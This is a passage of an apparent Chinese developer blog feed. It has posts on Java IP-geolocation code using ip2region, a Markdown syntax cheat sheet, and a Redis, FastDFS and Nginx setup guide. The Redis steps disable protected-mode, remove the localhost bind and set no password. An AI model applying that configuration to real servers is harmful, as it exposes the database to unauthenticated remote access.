class="line">				result.append(&quot;&#123;name: &apos;&quot;).append(k).append(&quot;&apos;,value: &quot;).append(v).append(&quot;&#125;,&quot;);</span><br><span class="line">			&#125;);</span><br><span class="line">			System.out.println(result.toString());</span><br><span class="line">			System.out.println(other);</span><br><span class="line">			try &#123;</span><br><span class="line">				// 保存其他数据</span><br><span class="line">				FileOutputStream fos = new FileOutputStream(new File(&quot;D:\\otherIP.txt&quot;));</span><br><span class="line">				fos.write(other.toString().getBytes());</span><br><span class="line">				fos.close();</span><br><span class="line">			&#125; catch (FileNotFoundException e) &#123;</span><br><span class="line">				// TODO Auto-generated catch block</span><br><span class="line">				e.printStackTrace();</span><br><span class="line">			&#125; catch (IOException e) &#123;</span><br><span class="line">				// TODO Auto-generated catch block</span><br><span class="line">				e.printStackTrace();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	/**</span><br><span class="line">	 * 发起http请求并获取结果</span><br><span class="line">	 * </span><br><span class="line">	 * @param requestUrl    请求地址</span><br><span class="line">	 * @param requestMethod 请求方式（GET、POST）</span><br><span class="line">	 * @param outputStr     提交的数据</span><br><span class="line">	 * @return JSONObject(通过JSONObject.get(key)的方式获取json对象的属性值)</span><br><span class="line">	 */</span><br><span class="line">	public static JSONObject httpRequest(String requestUrl, String requestMethod, String outputStr) &#123;</span><br><span class="line">		JSONObject jsonObject = null;</span><br><span class="line">		StringBuffer buffer = new StringBuffer();</span><br><span class="line">		InputStream inputStream = null;</span><br><span class="line">		try &#123;</span><br><span class="line">			URL url = new URL(requestUrl);</span><br><span class="line">			HttpURLConnection httpUrlConn = (HttpURLConnection) url.openConnection();</span><br><span class="line">			httpUrlConn.setDoOutput(true);</span><br><span class="line">			httpUrlConn.setDoInput(true);</span><br><span class="line">			httpUrlConn.setUseCaches(false);</span><br><span class="line">			// 设置请求方式（GET/POST）</span><br><span class="line">			httpUrlConn.setRequestMethod(requestMethod);</span><br><span class="line">			if (&quot;GET&quot;.equalsIgnoreCase(requestMethod))</span><br><span class="line">				httpUrlConn.connect();</span><br><span class="line"></span><br><span class="line">			// 当有数据需要提交时</span><br><span class="line">			if (null != outputStr) &#123;</span><br><span class="line">				OutputStream outputStream = httpUrlConn.getOutputStream();</span><br><span class="line">				// 注意编码格式，防止中文乱码</span><br><span class="line">				outputStream.write(outputStr.getBytes(&quot;UTF-8&quot;));</span><br><span class="line">				outputStream.close();</span><br><span class="line">			&#125;</span><br><span class="line">			// 将返回的输入流转换成字符串</span><br><span class="line">			inputStream = httpUrlConn.getInputStream();</span><br><span class="line">			InputStreamReader inputStreamReader = new InputStreamReader(inputStream, &quot;utf-8&quot;);</span><br><span class="line">			BufferedReader bufferedReader = new BufferedReader(inputStreamReader);</span><br><span class="line"></span><br><span class="line">			String str = null;</span><br><span class="line">			while ((str = bufferedReader.readLine()) != null) &#123;</span><br><span class="line">				buffer.append(str);</span><br><span class="line">			&#125;</span><br><span class="line">			bufferedReader.close();</span><br><span class="line">			inputStreamReader.close();</span><br><span class="line">			// 释放资源</span><br><span class="line">			inputStream.close();</span><br><span class="line">			inputStream = null;</span><br><span class="line">			httpUrlConn.disconnect();</span><br><span class="line">			jsonObject = JSONObject.parseObject(buffer.toString());</span><br><span class="line">		&#125; catch (ConnectException ce) &#123;</span><br><span class="line">			ce.printStackTrace();</span><br><span class="line">			System.out.println(&quot;server connection timed out&quot;);</span><br><span class="line">		&#125; catch (Exception e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">			System.out.println(&quot;http request error:&#123;&#125;&quot;);</span><br><span class="line">		&#125; finally &#123;</span><br><span class="line">			try &#123;</span><br><span class="line">				if (inputStream != null) &#123;</span><br><span class="line">					inputStream.close();</span><br><span class="line">				&#125;</span><br><span class="line">			&#125; catch (IOException e) &#123;</span><br><span class="line">				e.printStackTrace();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		return jsonObject;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>根据生成的文本替换Echart的数据，这里没有全部跑完所以没做展示，可以参考之前的文章-<a href="https://xuchunlei.top/2020/04/02/IP%E5%9C%B0%E5%9D%80%E5%88%86%E5%B8%83%E5%88%86%E6%9E%90(%E5%9B%BD%E5%86%85)/">IP地址分布分析(国内)</a></p>
]]></content>
      <tags>
        <tag>Java</tag>
        <tag>IP</tag>
        <tag>Echarts</tag>
      </tags>
  </entry>
  <entry>
    <title>IP地址分布分析(国内)·叄</title>
    <url>/2020/05/13/IP%E5%9C%B0%E5%9D%80%E5%88%86%E5%B8%83%E5%88%86%E6%9E%90-%E5%9B%BD%E5%86%85-%C2%B7%E5%8F%84/</url>
    <content><![CDATA[<h2 id="IP地址分布分析-国内-·叄"><a href="#IP地址分布分析-国内-·叄" class="headerlink" title="IP地址分布分析(国内)·叄"></a>IP地址分布分析(国内)·叄</h2><p><em>最近碰上IP地址数据量百万级的，原来的两套方案根本不能用，于是乎就有了叄。工作可用→工作用</em></p>
<h3 id="ip所在地来源"><a href="#ip所在地来源" class="headerlink" title="ip所在地来源"></a>ip所在地来源</h3><p>因为数据量比较大，还是本地化比较好。最后选用了国内大神写的<a href="https://gitee.com/lionsoul/ip2region" target="_blank" rel="noopener">ip2region</a>，准确率99.9%的离线IP地址定位库，0.0x毫秒级查询，数据库文件大小只有1.5M，提供了java,php,c,python,nodejs,golang,c#等查询绑定和Binary,B树,内存三种查询算法。数据库最后更新时间为6个月前，感觉问题不大，存在部分IP和现在有偏差。<br>数据格式为<code>_城市Id|国家|区域|省份|城市|ISP_</code>，只有中国的数据精确到了城市，其他国家有部分数据只能定位到国家，后面的选项全部是0。查不到数据时，也会为0。</p>
<h3 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h3><p>因为数据量巨大，已经超过Excel的处理范围(最大行1048576)。提供过来的数据，分成了5块，接近500W的原始数据。Excel对大数据(主要是行数，之前几个G的数据没发现问题，只是字段多，数据量96W)的处理显得很无力，比如筛选出来的结果不对(前面空白数据的锅吗？)。<br><img src="/img/20200513/1.jpg" alt><br>这时候只能用数据库来筛选数据，发现默认配置下SqlServer比MySql快多了。<br>首先先用Excle的去重功能去掉重复数据，然后分别导入到一张数据库表里，再通过数据库去重插入新表，最后筛选出200W的不重复IP。<br><img src="/img/20200513/2.png" alt><br>然后执行ip2region，根据导出的IP获取region信息，导出到文本文件。200W数据在内存查询算法下耗时8秒。<br><img src="/img/20200513/3.png" alt><br>最后把生成的结果再导回数据库，分组查询。<br><img src="/img/20200513/4.png" alt><br>省为0的，可以用高德地图的ip定位API来进行二次判定。</p>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><p>下载ip2region的代码拷到自己的工程，我用的是Java，把<code>binding/java</code>下的代码拷到了自己之前写的工程（新建工程就行）。还需要拷贝数据库文件<code>data/ip2region.db</code>。我的代码结构如下<br><img src="/img/20200513/5.png" alt><br>新建Java入口文件,代码如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import java.io.BufferedReader;</span><br><span class="line">import java.io.File;</span><br><span class="line">import java.io.FileNotFoundException;</span><br><span class="line">import java.io.FileOutputStream;</span><br><span class="line">import java.io.FileReader;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line">import java.util.ArrayList;</span><br><span class="line">import java.util.List;</span><br><span class="line"></span><br><span class="line">import org.lionsoul.ip2region.DataBlock;</span><br><span class="line">import org.lionsoul.ip2region.DbConfig;</span><br><span class="line">import org.lionsoul.ip2region.DbSearcher;</span><br><span class="line">import org.lionsoul.ip2region.Util;</span><br><span class="line">import org.lionsoul.ip2region.test.TestUtil;</span><br><span class="line"></span><br><span class="line">public class IpDistributionCreaterByip2region &#123;</span><br><span class="line"></span><br><span class="line">	public static void main(String args[]) &#123;</span><br><span class="line">//		String[] ips = &#123; &quot;116.116.91.150&quot;, // 正常内蒙古</span><br><span class="line">//				&quot;127.0.0.1&quot;, // 本地</span><br><span class="line">//				&quot;172.58.22.176&quot;, // 美国</span><br><span class="line">//				&quot;223.104.212.147&quot;, // geoip上海</span><br><span class="line">//				&quot;223.104.148.122&quot;, // geoip江苏</span><br><span class="line">//				&quot;47.75.7.133&quot; &#125;; // 正常香港</span><br><span class="line">//		ipDistributionCreater(ips);</span><br><span class="line"></span><br><span class="line">		// 数据量大时从文件读取</span><br><span class="line">		List&lt;String&gt; ipList = new ArrayList&lt;String&gt;();</span><br><span class="line">		try &#123;</span><br><span class="line">			BufferedReader br = new BufferedReader(new FileReader(&quot;D:\\useripdis.txt&quot;));</span><br><span class="line">			String lineStr = &quot;&quot;;</span><br><span class="line">			while ((lineStr = br.readLine()) != null) &#123;</span><br><span class="line">				ipList.add(lineStr);</span><br><span class="line">			&#125;</span><br><span class="line">			br.close();</span><br><span class="line">			//System.out.println(&quot;读取&quot; + ipList.size() + &quot;条IP&quot;);</span><br><span class="line">		&#125; catch (FileNotFoundException e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125; catch (IOException e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">		String[] ips = &#123;&#125;;</span><br><span class="line">		ipDistributionCreater(ipList.toArray(ips));</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	public static void ipDistributionCreater(String ips[]) &#123;</span><br><span class="line">		try &#123;</span><br><span class="line">			long startTime =  System.currentTimeMillis();</span><br><span class="line">			DbConfig config = new DbConfig();</span><br><span class="line">			DbSearcher searcher = new DbSearcher(config, TestUtil.class.getResource(&quot;../data/ip2region.db&quot;).getPath()); // 貌似需要完整路径</span><br><span class="line"></span><br><span class="line">			// btreeSearch binarySearch memorySearch</span><br><span class="line">			Method method = searcher.getClass().getMethod(&quot;memorySearch&quot;, String.class); //内存查询算法</span><br><span class="line"></span><br><span class="line">			FileOutputStream fos = new FileOutputStream(new File(&quot;D:\\ipResult.txt&quot;));</span><br><span class="line"></span><br><span class="line">			DataBlock dataBlock = null;</span><br><span class="line">			for (int i = 0; i &lt; ips.length; i++) &#123;</span><br><span class="line">				if (Util.isIpAddress(ips[i])) &#123;</span><br><span class="line">					dataBlock = (DataBlock) method.invoke(searcher, ips[i]);</span><br><span class="line">					String[] regionAry = dataBlock.getRegion().split(&quot;\\|&quot;);</span><br><span class="line">					String result = ips[i] + &quot;\t&quot; + regionAry[0] + &quot;\t&quot; + regionAry[2] + &quot;\t&quot; + regionAry[3] + &quot;\r\n&quot;;</span><br><span class="line">					//System.out.print(i + &quot;:&quot; + result);</span><br><span class="line">					fos.write(result.getBytes());</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			fos.close();</span><br><span class="line">			System.out.println(&quot;Finish&quot;);</span><br><span class="line">			long endTime =  System.currentTimeMillis();</span><br><span class="line">			System.out.println((endTime-startTime)/1000 + &quot;s&quot;);</span><br><span class="line"></span><br><span class="line">		&#125; catch (Exception e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://xuchunlei.top/2020/04/02/IP%E5%9C%B0%E5%9D%80%E5%88%86%E5%B8%83%E5%88%86%E6%9E%90(%E5%9B%BD%E5%86%85)/">IP地址分布分析(国内)</a><br><a href="https://xuchunlei.top/2020/04/17/IP%E5%9C%B0%E5%9D%80%E5%88%86%E5%B8%83%E5%88%86%E6%9E%90-%E5%9B%BD%E5%86%85-%C2%B7%E7%BB%AD/">IP地址分布分析(国内)·续</a></p>
]]></content>
      <tags>
        <tag>Java</tag>
        <tag>IP</tag>
        <tag>Echarts</tag>
      </tags>
  </entry>
  <entry>
    <title>Markdown参考</title>
    <url>/2020/02/04/Markdown%E5%8F%82%E8%80%83/</url>
    <content><![CDATA[<h1 id="Markdown参考"><a href="#Markdown参考" class="headerlink" title="Markdown参考"></a>Markdown参考</h1><p><em>简单写了一下Markdown常用的语法，供以后参考（不必再去搜索，手动滑稽）</em></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">标题：</span><br><span class="line">使用 # 号标记(可用 = 和 - 标记替换一级和二级标题)</span><br><span class="line"># 一级标题</span><br><span class="line">## 二级标题</span><br><span class="line">### 三级标题</span><br><span class="line">#### 四级标题</span><br><span class="line">##### 五级标题</span><br><span class="line">###### 六级标题</span><br><span class="line">一级标题</span><br><span class="line">===</span><br><span class="line">二级标题</span><br><span class="line">---</span><br></pre></td></tr></table></figure>

<h1 id="一级标题"><a href="#一级标题" class="headerlink" title="一级标题"></a>一级标题</h1><h2 id="二级标题"><a href="#二级标题" class="headerlink" title="二级标题"></a>二级标题</h2><h3 id="三级标题"><a href="#三级标题" class="headerlink" title="三级标题"></a>三级标题</h3><h4 id="四级标题"><a href="#四级标题" class="headerlink" title="四级标题"></a>四级标题</h4><h5 id="五级标题"><a href="#五级标题" class="headerlink" title="五级标题"></a>五级标题</h5><h6 id="六级标题"><a href="#六级标题" class="headerlink" title="六级标题"></a>六级标题</h6><h1 id="一级标题-1"><a href="#一级标题-1" class="headerlink" title="一级标题"></a>一级标题</h1><h2 id="二级标题-1"><a href="#二级标题-1" class="headerlink" title="二级标题"></a>二级标题</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">图片：</span><br><span class="line">![alt 属性文本](图片地址)</span><br><span class="line">![alt 属性文本](图片地址 &quot;可选标题&quot;)</span><br><span class="line"></span><br><span class="line">![alt 属性文本](https://xuchunlei.top/img/favicon.png)</span><br><span class="line">![alt 属性文本](https://xuchunlei.top/img/favicon.png &quot;可选标题&quot;)</span><br><span class="line">到目前为止，Markdown还没有办法指定图片的宽高，可以使用普通的&lt;img&gt;标签代替</span><br></pre></td></tr></table></figure>

<p><img src="https://xuchunlei.top/img/favicon.png" alt="alt 属性文本"><br><img src="https://xuchunlei.top/img/favicon.png" alt="alt 属性文本" title="可选标题"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">格式：</span><br><span class="line">*斜体* _斜体_</span><br><span class="line">**粗体**  __粗体__</span><br><span class="line">***粗斜体*** ___粗斜体___</span><br><span class="line">上标：X&lt;sup&gt;u&lt;/sup&gt;，下标：CH&lt;sub&gt;un&lt;/sub&gt;</span><br><span class="line">`高亮`</span><br><span class="line">~~删除线~~ &lt;s&gt;删除线&lt;/s&gt;</span><br><span class="line">&lt;u&gt;下划线&lt;/u&gt;</span><br></pre></td></tr></table></figure>

<p><em>斜体</em> <em>斜体</em><br><strong>粗体</strong>  <strong>粗体</strong><br><strong><em>粗斜体</em></strong> <strong><em>粗斜体</em></strong><br>上标：X<sup>u</sup>，下标：CH<sub>un</sub><br><code>高亮</code><br><del>删除线</del> <s>删除线</s><br><u>下划线</u></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">分隔线，一行中用三个以上的星号、减号、底线来建立一个分隔线，行内不能有其他东西。</span><br><span class="line">你也可以在星号或是减号中间插入空格。</span><br><span class="line">***</span><br><span class="line">* * *</span><br><span class="line">*****</span><br><span class="line">- - -</span><br><span class="line">---------</span><br></pre></td></tr></table></figure>

<hr>
<hr>
<hr>
<hr>
<hr>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">区块引用：</span><br><span class="line">每行的最前面加上 &gt;</span><br><span class="line">&gt; ## 区块引用（二级标题）</span><br><span class="line">&gt; &gt; 第一层嵌套</span><br><span class="line">&gt; &gt; &gt; * 第二层嵌套1（无序列表）</span><br><span class="line">&gt; &gt; &gt; * 第二层嵌套2（无序列表）</span><br></pre></td></tr></table></figure>

<blockquote>
<h2 id="区块引用（二级标题）"><a href="#区块引用（二级标题）" class="headerlink" title="区块引用（二级标题）"></a>区块引用（二级标题）</h2><blockquote>
<p>第一层嵌套</p>
<blockquote>
<ul>
<li>第二层嵌套1（无序列表）</li>
<li>第二层嵌套2（无序列表）</li>
</ul>
</blockquote>
</blockquote>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">列表：</span><br><span class="line">无序列表使用星号*、加号+或是减号-作为列表标记</span><br><span class="line">+ 无序列表一</span><br><span class="line">+ 无序列表二</span><br><span class="line">    + 无序嵌套列表二-1</span><br><span class="line">    + 无序嵌套列表二-2</span><br><span class="line">有序列表则使用数字接着一个英文句点（数字并不会影响输出的 HTML 结果）</span><br><span class="line">1. 有序列表一</span><br><span class="line">2. 有序列表二</span><br><span class="line">列表嵌套只需在子列表中的选项添加四个空格</span><br></pre></td></tr></table></figure>

<ul>
<li>无序列表一</li>
<li>无序列表二<ul>
<li>无序嵌套列表二-1</li>
<li>无序嵌套列表二-2</li>
</ul>
</li>
</ul>
<ol>
<li>有序列表一</li>
<li>有序列表二</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">链接：</span><br><span class="line">[链接名称](链接地址)或&lt;链接地址&gt;</span><br><span class="line"></span><br><span class="line">[链接](https://xuchunlei.top/2020/02/04/Markdown参考/) 自动链接&lt;https://xuchunlei.top/2020/02/04/Markdown参考/&gt;</span><br><span class="line">[链接带标题](https://xuchunlei.top/2020/02/04/Markdown参考/ &quot;标题&quot;)</span><br><span class="line">锚点链接 隐式链接标记，用变量来代替，可以把它放在文件最后面，就像是注解一样（这里页面显示不对）</span><br><span class="line">[锚点链接 隐式链接标记1][anchor-id]</span><br><span class="line">[锚点链接 隐式链接标记2][anchor-id]</span><br><span class="line">[anchor-id]: https://xuchunlei.top/2020/02/04/Markdown参考/</span><br><span class="line">邮箱1[xuchl@xuchunlei.top](mailto:xuchl@xuchunlei.top) 邮箱2 xuchl@xuchunlei.top</span><br></pre></td></tr></table></figure>

<p><a href="https://xuchunlei.top/2020/02/04/Markdown参考/">链接</a> 自动链接<a href="https://xuchunlei.top/2020/02/04/Markdown参考/">https://xuchunlei.top/2020/02/04/Markdown参考/</a><br><a href="https://xuchunlei.top/2020/02/04/Markdown参考/" title="标题">链接带标题</a><br>[锚点链接 隐式链接标记1][anchor-id]<br>[锚点链接 隐式链接标记2][anchor-id]<br>[anchor-id]: <a href="https://xuchunlei.top/2020/02/04/Markdown参考/">https://xuchunlei.top/2020/02/04/Markdown参考/</a><br>邮箱1<a href="mailto:xuchl@xuchunlei.top">xuchl@xuchunlei.top</a> 邮箱2 <a href="mailto:xuchl@xuchunlei.top">xuchl@xuchunlei.top</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">表格：</span><br><span class="line">使用 | 来分隔不同的单元格，使用 - 来分隔表头和其他行。</span><br><span class="line">:- 设置内容和标题栏居左对齐，:-:居中，-: 右对齐</span><br><span class="line">| 默认 | 左对齐 | 居中 | 右对齐 |</span><br><span class="line">| ---- | :----- | :----: | ----: |</span><br><span class="line">| 单元格 | 单元格 | `单元格` | 单元格 |</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>默认</th>
<th align="left">左对齐</th>
<th align="center">居中</th>
<th align="right">右对齐</th>
</tr>
</thead>
<tbody><tr>
<td>单元格</td>
<td align="left">单元格</td>
<td align="center"><code>单元格</code></td>
<td align="right">单元格</td>
</tr>
</tbody></table>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">代码：</span><br><span class="line">函数或片段的代码可以用反引号</span><br><span class="line">通过`alert(&apos;Hello World&apos;)`弹出Hello World</span><br><span class="line">代码区块可用四个空格或者一个制表位</span><br><span class="line">    console.log(&quot;Hello world 空格&quot;)</span><br><span class="line">    console.log(&quot;Hello world 空格&quot;)</span><br><span class="line"></span><br><span class="line">	console.log(&quot;Hello world Tab&quot;)</span><br><span class="line">	console.log(&quot;Hello world Tab&quot;)</span><br><span class="line">也可以用代码区域设置符号三个反引号</span><br></pre></td></tr></table></figure>

<p>通过<code>alert(&#39;Hello World&#39;)</code>弹出Hello World</p>
<pre><code>console.log(&quot;Hello world 空格&quot;)
console.log(&quot;Hello world 空格&quot;)

console.log(&quot;Hello world Tab&quot;)
console.log(&quot;Hello world Tab&quot;)</code></pre><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 三个反引号后加html --&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>html代码<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello world<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>Markdown</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux服务器搭建-Redis与FastDFS</title>
    <url>/2020/02/11/Linux%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA-Redis%E4%B8%8EFastDFS/</url>
    <content><![CDATA[<h1 id="Linux服务器搭建-Redis与FastDFS"><a href="#Linux服务器搭建-Redis与FastDFS" class="headerlink" title="Linux服务器搭建-Redis与FastDFS"></a>Linux服务器搭建-Redis与FastDFS</h1><p><em>简单记录了配置过程，仅供个人学习用。实际上会用到多台服务器，配置更复杂。</em></p>
<h4 id="起因（可忽略）"><a href="#起因（可忽略）" class="headerlink" title="起因（可忽略）"></a>起因（可忽略）</h4><p>因为新型冠状病毒的影响，没有火车站的小县城在市际班车停运的情况下，无法回到工作岗位，然后就开始在家办公模式。因为有新任务，加上自己的电脑没有公司的开发环境，只好通过TeamViewer（公司没有VPN）远程公司电脑（公司有人，帮忙开机之类的）。用了不到一天就被逼疯了，效率太低。然后决定自己搭建开发环境。不过这个是我很不想干的事情，总会出幺蛾子，比如头疼的Maven，死活下不下来，远程复制公司的jar包到Maven仓库下，jar不出错了，但是还是编译不通过，最后删掉所有的私有仓库和插件库好了……公司的框架比较老，比较重（全面），和我电脑环境有点不兼容，比如MySQL的数据库。因为新任务比较简单，用不了太多的功能，主要搭建了Redis缓存和FastDFS文件服务器。</p>
<h4 id="Redis安装"><a href="#Redis安装" class="headerlink" title="Redis安装"></a>Redis安装</h4><p>以前在Win7中装过-<a href="https://mp.weixin.qq.com/s?__biz=MzIwMjgwNTI0Mg==&mid=2247483713&idx=1&sn=d35bd94c0abf527b56229487d79fdabc&scene=19#wechat_redirect" target="_blank" rel="noopener">NoSQL数据库Redis从入门到没有然后</a>，这次在Linux虚拟机中安装。先把VMware虚拟机的网络适配器改成桥接模式，以便于设置固定ip。</p>
<p>先从<a href="https://redis.io/download" target="_blank" rel="noopener">https://redis.io/download</a>下载最新稳定版本5.0.7，解压，编译。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget http://download.redis.io/releases/redis-5.0.7.tar.gz</span><br><span class="line">tar xzf redis-5.0.7.tar.gz</span><br><span class="line">cd cd redis-5.0.7/</span><br><span class="line">make</span><br></pre></td></tr></table></figure>

<p>make完后 redis-5.0.7目录src下会出现编译后的redis服务程序redis-server，执行<code>./redis-server</code>就可以通过前端模式启动了，不过ssh命令窗口关闭，redis-server程序就结束了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd src</span><br><span class="line">./redis-server</span><br></pre></td></tr></table></figure>

<blockquote>
<p>后端模式启动</p>
<blockquote>
<p>修改redis.conf配置文件把<code>daemonize no</code>改为线程守护<code>yes</code></p>
</blockquote>
</blockquote>
<p>修改配置文件redis.conf，打开远程连接（把<code>protected-mode yes</code>改为<code>no</code>并注释掉（前加#）<code>bing 127.0.0.1</code>未设置密码<code>requirepass</code>）。</p>
<p>重启Redis，查找并关闭进程。并指定启动服务配置文件，不然按默认启动（这里坑了，修改了配置文件，一直提示我不能远程连接）。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ps -ef|grep redis</span><br><span class="line">kill 相关进程</span><br><span class="line">./redis-server redis.conf</span><br></pre></td></tr></table></figure>

<p><img src="/img/20200211/1.jpg" alt><br>你也可以建立redis服务，设置成开机启动，这里偷懒。</p>
<h4 id="FastDFS安装"><a href="#FastDFS安装" class="headerlink" title="FastDFS安装"></a>FastDFS安装</h4><p>FastDFS是一个开源的轻量级分布式文件系统，这里主要用来保存图片和文件并访问。</p>
<ol>
<li><p>先用git（没有git环境先执行<code>git apt-get install git</code>）克隆libfastcommon库（libfastcommon是从 FastDFS 和 FastDHT 中提取出来的公共 C 函数库，基础环境），进入目录编译并且安装。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/happyfish100/libfastcommon.git</span><br><span class="line">cd libfastcommon/</span><br><span class="line">./make.sh</span><br><span class="line">./make.sh install</span><br></pre></td></tr></table></figure>
</li>
<li><p>设置环境变量（注意32位系统没有64）和软连接</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export LD_LIBRARY_PATH=/usr/lib64/</span><br><span class="line">ln -s /usr/lib64/libfastcommon.so /usr/local/lib/libfastcommon.so</span><br></pre></td></tr></table></figure>
</li>
<li><p>安装FastDFS<br>从<a href="https://github.com/happyfish100/fastdfs/releases" target="_blank" rel="noopener">https://github.com/happyfish100/fastdfs/releases</a>获取最新版本6.06，解压编译安装。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget wget https://github.com/happyfish100/fastdfs/archive/V6.06.tar.gz</span><br><span class="line">tar xzf V6.06.tar.gz </span><br><span class="line">cd fastdfs-6.06/</span><br><span class="line">./make.sh</span><br><span class="line">./make.sh install</span><br></pre></td></tr></table></figure>
</li>
<li><p>修改配置文件<br>默认安装路径/etc/fdfs下的client.conf.sample，storage.conf.sample，tracker.conf.sample三个参考配置文件。<br>配置跟踪器 tracker.conf，这里端口使用默认的22122，不建议修改。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd /etc/fdfs</span><br><span class="line">cp tracker.conf.sample tracker.conf</span><br><span class="line">vim tracker.conf</span><br></pre></td></tr></table></figure>

</li>
</ol>
<p>修改下面两个参数<br>Tracker数据和日志目录地址（目录必须存在）<br><code>base_path = /home/xuchunlei/Desktop/linkstart/upload/tracker</code><br>HTTP 服务端口<br><code>http.server_port = 80</code></p>
<p>配置存储 storage.conf，端口依旧使用默认的23000。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd /etc/fdfs</span><br><span class="line">cp storage.conf.sample storage.conf</span><br><span class="line">vim storage.conf</span><br></pre></td></tr></table></figure>

<p>Storage 数据和日志目录地址（目录必须存在）<br><code>base_path = /home/xuchunlei/Desktop/linkstart/upload/storage</code><br>逐一配置 store_path_count 个路径（索引号从0开始，不配置store_path0就和base_path路径一样）<br><code>store_path0 = /home/xuchunlei/Desktop/linkstart/upload/file</code><br>tracker_server列表，这里只有一个，注释掉多余的，ip对应linux服务器的ip<br><code>tracker_server = 192.168.1.111:22122</code><br>访问端口<br><code>http.server_port = 80</code></p>
<ol start="5">
<li><p>启动服务<br>启动服务，22122和23000端口被监听说明启动成功。这里依然可以添加到服务，并开机启动。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/usr/bin/fdfs_trackerd /etc/fdfs/tracker.conf</span><br><span class="line">/usr/bin/fdfs_storaged /etc/fdfs/storage.conf</span><br><span class="line">netstat -unltp|grep fdfs</span><br></pre></td></tr></table></figure>
</li>
<li><p>测试上传文件<br>修改客户端 client.conf</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd /etc/fdfs</span><br><span class="line">cp client.conf.sample client.conf</span><br><span class="line">vim client.conf</span><br></pre></td></tr></table></figure>

</li>
</ol>
<p>Client 的数据和日志目录<br><code>base_path = /home/xuchunlei/Desktop/linkstart/upload/log</code><br>Tracker端口<br><code>tracker_server = 192.168.1.111:22122</code></p>
<p>文件上传</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fdfs_test /etc/fdfs/client.conf upload /home/xuchunlei/Desktop/test.png</span><br></pre></td></tr></table></figure>

<p><img src="/img/20200211/2.png" alt></p>
<h4 id="FastDFS-http访问"><a href="#FastDFS-http访问" class="headerlink" title="FastDFS http访问"></a>FastDFS http访问</h4><p>虽然上传成功文件，但是这个时候是不能通过http来访问的，一般通过Nginx访问扩展模块来访问。</p>
<ol>
<li><p>安装Nginx<br>从<a href="https://nginx.org/en/download.html" target="_blank" rel="noopener">https://nginx.org/en/download.html</a>选择最新版本1.17.8。使用默认配置编译安装启动。浏览器访问localhost，出现Nginx界面表示安装成功。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget http://nginx.org/download/nginx-1.17.8.tar.gz</span><br><span class="line">tar xzf nginx-1.17.8.tar.gz </span><br><span class="line">cd nginx-1.17.8</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make install</span><br><span class="line">/usr/local/nginx/sbin/nginx</span><br></pre></td></tr></table></figure>
</li>
<li><p>安装fastdfs-nginx-module模块<br>在Nginx中添加fastdfs-nginx处理模块。</p>
